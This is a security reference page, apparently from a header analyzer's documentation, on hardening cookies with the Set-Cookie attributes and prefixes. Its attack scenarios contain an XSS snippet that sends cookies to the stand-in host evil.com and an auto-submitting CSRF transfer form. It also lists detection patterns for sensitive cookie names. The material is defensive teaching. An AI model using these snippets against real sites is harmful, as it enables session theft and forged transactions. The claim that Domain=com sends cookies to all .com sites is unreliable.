# Set-Cookie Security Header

## Quick Reference

**Header:** `Set-Cookie`
**Purpose:** Secure cookie attributes to prevent session hijacking and CSRF
**Severity if Missing:** Medium (if cookies are used)
**Complexity:** Medium

**Best Practice:**
```
Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Strict; Max-Age=86400; Path=/
```

---

## What It Does

Set-Cookie header creates cookies on the client. Security attributes control how browsers handle these cookies, preventing common attacks like session hijacking, XSS cookie theft, and CSRF.

---

## Security Attributes

### Secure
Ensures cookie only sent over HTTPS, never HTTP.
```
Set-Cookie: session=abc123; Secure
```

### HttpOnly
Prevents JavaScript access to cookie (blocks XSS theft).
```
Set-Cookie: session=abc123; HttpOnly
```

### SameSite
Controls cross-site cookie transmission:
- **Strict** - Never sent with cross-site requests (strongest)
- **Lax** - Sent with top-level navigation (balanced)
- **None** - Sent with all requests (requires Secure)

```
Set-Cookie: session=abc123; SameSite=Strict
```

### Cookie Prefixes (NEW)
RFC 6265bis defines cookie name prefixes that enforce security constraints:

#### __Secure- Prefix
**Requirements:**
- Must have Secure attribute

**Example:**
```
Set-Cookie: __Secure-token=abc123; Secure; HttpOnly; SameSite=Lax
```

**Violation:**
```
Set-Cookie: __Secure-token=abc123; HttpOnly; SameSite=Lax
# ERROR: Missing Secure attribute
```

#### __Host- Prefix
**Requirements:**
- Must have Secure attribute
- Must NOT have Domain attribute
- Must have Path=/ or omit Path (defaults to /)

**Example:**
```
Set-Cookie: __Host-session=abc123; Secure; HttpOnly; SameSite=Strict; Path=/
```

**Violations:**
```
Set-Cookie: __Host-session=abc123; HttpOnly; SameSite=Strict; Path=/
# ERROR: Missing Secure attribute

Set-Cookie: __Host-session=abc123; Secure; HttpOnly; Domain=example.com; Path=/
# ERROR: Has Domain attribute (not allowed for __Host-)

Set-Cookie: __Host-session=abc123; Secure; HttpOnly; Path=/api
# ERROR: Path must be / (or omitted)
```

**Why Use Cookie Prefixes:**
- Prevents cookie tossing attacks
- Ensures cookies can't be overwritten by subdomains
- Guarantees secure transport for sensitive cookies
- Browser enforces constraints automatically

### Domain and Path Scope (NEW)

#### Domain Attribute
Controls which hosts can receive the cookie:

**Omit Domain (Recommended):**
```
Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Strict
# Cookie only sent to exact origin (example.com, not sub.example.com)
```

**Domain with Leading Dot (Applies to Subdomains):**
```
Set-Cookie: session=abc123; Secure; HttpOnly; Domain=.example.com
# WARNING: Cookie sent to all subdomains (sub.example.com, api.example.com, etc.)
```

**Overly Broad Domain (Dangerous):**
```
Set-Cookie: tracking=xyz; Secure; HttpOnly; Domain=com
# BAD: Cookie sent to ALL .com domains (very dangerous)
```

#### Path Attribute
Controls which paths can receive the cookie:

**Restrict to Specific Path (Recommended for sensitive cookies):**
```
Set-Cookie: admin-session=abc123; Secure; HttpOnly; SameSite=Strict; Path=/admin
# Cookie only sent to /admin/* paths
```

**Path=/ (Exposed to Entire Site):**
```
Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Strict; Path=/
# WARNING: Cookie sent to all paths on the site
```

### Sensitive Cookie Detection (NEW)

The analyzer detects cookies that appear to contain sensitive data based on name patterns:

**Detected Patterns:**
- Session identifiers: `session`, `sess`, `sid`, `jsessionid`, `phpsessid`
- Authentication: `auth`, `token`, `jwt`, `bearer`, `access`, `refresh`
- User identifiers: `user`, `uid`, `userid`
- CSRF tokens: `csrf`, `xsrf`

**Validation:**
Sensitive cookies flagged if they're missing BOTH Secure AND HttpOnly:

```
Set-Cookie: PHPSESSID=abc123
# HIGH SEVERITY: Sensitive cookie with no security attributes
```

```
Set-Cookie: PHPSESSID=abc123; Secure; HttpOnly; SameSite=Strict
# GOOD: Sensitive cookie properly protected
```

### SameSite=None Frequency Warning (NEW)

When ≥50% of cookies use `SameSite=None`, the analyzer warns about third-party cookie privacy risks:

**Example:**
```
Set-Cookie: cookie1=a; Secure; HttpOnly; SameSite=None
Set-Cookie: cookie2=b; Secure; HttpOnly; SameSite=None
Set-Cookie: cookie3=c; Secure; HttpOnly; SameSite=Strict
# WARNING: 2/3 cookies use SameSite=None (third-party cookies)
# Consider if cross-site cookie access is necessary for all cookies
```

**Why This Matters:**
- SameSite=None allows cross-site cookie transmission
- Enables tracking across different sites
- Privacy risk for users
- Should be used only when cross-site access is truly necessary

---

## Real-World Attack Scenarios

### Attack 1: Session Hijacking via XSS

**Without HttpOnly:**

**Attacker injects XSS:**
```html
<script>
fetch('https://evil.com?cookie=' + document.cookie);
</script>
```

**Result:** Session cookie stolen, account compromised

---

**With HttpOnly:**

```
Set-Cookie: session=abc123; HttpOnly
```

**JavaScript attempt:**
```javascript
document.cookie  // Returns empty string
```

**Result:** Cookie protected from XSS

---

### Attack 2: CSRF

**Without SameSite:**

**Attacker's page:**
```html
<form action="https://bank.com/transfer" method="POST">
    <input name="to" value="attacker">
    <input name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>
```

**Browser sends cookie with request** → Money transferred

---

**With SameSite=Strict:**

```
Set-Cookie: session=abc123; SameSite=Strict
```

**Browser blocks cross-site cookie** → Attack fails

---

### Attack 3: Man-in-the-Middle

**Without Secure:**

**HTTP request includes cookie:**
```
GET /page HTTP/1.1
Cookie: session=abc123
```

**Attacker on network sniffs unencrypted HTTP** → Session stolen

---

**With Secure:**

```
Set-Cookie: session=abc123; Secure
```

**Cookie only sent over HTTPS** → Protected from eavesdropping

---

### Attack 4: Cookie Tossing (Subdomain Takeover)

**Without __Host- Prefix:**

**Attacker compromises subdomain:**
```
# On compromised-subdomain.example.com:
Set-Cookie: session=malicious; Domain=.example.com; Path=/
```

**Browser overwrites legitimate cookie** → Session hijacked across all subdomains

---

**With __Host- Prefix:**

```
# On example.com:
Set-Cookie: __Host-session=abc123; Secure; HttpOnly; SameSite=Strict; Path=/
```

**Attacker's attempt fails:**
- Cannot set `__Host-` cookie with Domain attribute
- Browser enforces prefix constraints
- Cookie isolated to exact origin

**Result:** Cookie tossing attack prevented

---

### Attack 5: Overly Broad Domain Scope

**Dangerous Configuration:**

```
Set-Cookie: tracking=xyz; Secure; HttpOnly; Domain=com
```

**Impact:**
- Cookie sent to ALL .com domains
- Enables cross-domain tracking
- Privacy violation
- Likely a configuration error

---

**Secure Configuration:**

```
Set-Cookie: tracking=xyz; Secure; HttpOnly; SameSite=Lax
# Omit Domain - cookie scoped to exact origin only
```

**Result:** Cookie properly scoped

---

## Configuration Examples

### Excellent ✅ (NEW: With __Host- Prefix)
```
Set-Cookie: __Host-session=abc123; Secure; HttpOnly; SameSite=Strict; Path=/
```

Best practice: All security attributes + prefix constraints enforced.

### Good ✅
```
Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Strict; Max-Age=3600; Path=/
```

All security attributes present.

### Good ✅ (NEW: With __Secure- Prefix)
```
Set-Cookie: __Secure-token=xyz; Secure; HttpOnly; SameSite=Lax
```

Secure prefix ensures HTTPS-only transmission.

### Acceptable ⚠️
```
Set-Cookie: token=xyz; Secure; HttpOnly; SameSite=Lax
```

Using Lax instead of Strict (allows some cross-site requests).

### Bad ❌
```
Set-Cookie: session=abc123
```

No security attributes - vulnerable to all attacks.

### Bad ❌ (NEW: Prefix Violation)
```
Set-Cookie: __Secure-session=abc123; HttpOnly; SameSite=Strict
```

Violates __Secure- prefix requirement (missing Secure attribute).

### Bad ❌ (NEW: __Host- Violation)
```
Set-Cookie: __Host-session=abc123; Secure; HttpOnly; Domain=example.com; Path=/
```

Violates __Host- prefix requirement (has Domain attribute).

### Dangerous ❌
```
Set-Cookie: session=abc123; SameSite=None
```

SameSite=None without Secure is rejected by browsers.

### Dangerous ❌ (NEW: Overly Broad Domain)
```
Set-Cookie: tracking=xyz; Secure; HttpOnly; Domain=com
```

Overly broad domain - cookie sent to ALL .com domains.

---

## Common Mistakes

**1. Missing Secure on HTTPS Sites**
Always use Secure if serving over HTTPS.

**2. Not Using HttpOnly for Session Cookies**
Session cookies should always be HttpOnly.

**3. SameSite=None without Secure**
Invalid combination, browser rejects.

**4. Overly Long Max-Age**
```
Max-Age=31536000  # 1 year - too long for session cookies
```
Use shorter expiry for sensitive cookies.

**5. Incorrect __Secure- Prefix Usage (NEW)**
```
Set-Cookie: __Secure-token=abc123; HttpOnly; SameSite=Strict
# ERROR: Missing Secure attribute (violates prefix constraint)
```
Always include Secure when using __Secure- prefix.

**6. Incorrect __Host- Prefix Usage (NEW)**
```
Set-Cookie: __Host-session=abc123; Secure; HttpOnly; Domain=example.com; Path=/
# ERROR: __Host- prefix cannot have Domain attribute

Set-Cookie: __Host-session=abc123; Secure; HttpOnly; Path=/api
# ERROR: __Host- prefix requires Path=/ or omit Path
```
__Host- prefix has strict requirements - no Domain, Path must be /.

**7. Overly Broad Domain Scope (NEW)**
```
Set-Cookie: tracking=xyz; Secure; HttpOnly; Domain=.example.com
# WARNING: Cookie sent to all subdomains
```
Omit Domain attribute to restrict cookie to exact origin.

**8. Excessive Third-Party Cookies (NEW)**
```
# Multiple cookies with SameSite=None
Set-Cookie: ad1=x; Secure; HttpOnly; SameSite=None
Set-Cookie: ad2=y; Secure; HttpOnly; SameSite=None
Set-Cookie: ad3=z; Secure; HttpOnly; SameSite=None
# WARNING: Privacy risk - consider necessity of cross-site access
```
Only use SameSite=None when cross-site cookie transmission is required.

---

## Implementation

**Express.js:**
```javascript
res.cookie('session', 'value', {
    secure: true,
    httpOnly: true,
    sameSite: 'strict',
    maxAge: 3600000
});
```

**PHP:**
```php
setcookie('session', 'value', [
    'secure' => true,
    'httponly' => true,
    'samesite' => 'Strict'
]);
```

**Django:**
```python
SESSION_COOKIE_SECURE = True
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_SAMESITE = 'Strict'
```

---

## Browser Compatibility

| Attribute | Support |
|-----------|---------|
| Secure | All browsers |
| HttpOnly | All modern browsers |
| SameSite | Chrome 51+, Firefox 60+, Safari 12+ |

**SameSite** not supported in IE11 (degrades gracefully).

---

## See Also

- [HSTS](HSTS.md) - Enforce HTTPS
- [CSP](CSP.md) - Additional XSS protection
- [Analyzer Docs](../analyzer-reference.md#set-cookie)

---

**Last Updated:** 2025-12-12
**Status:** Active
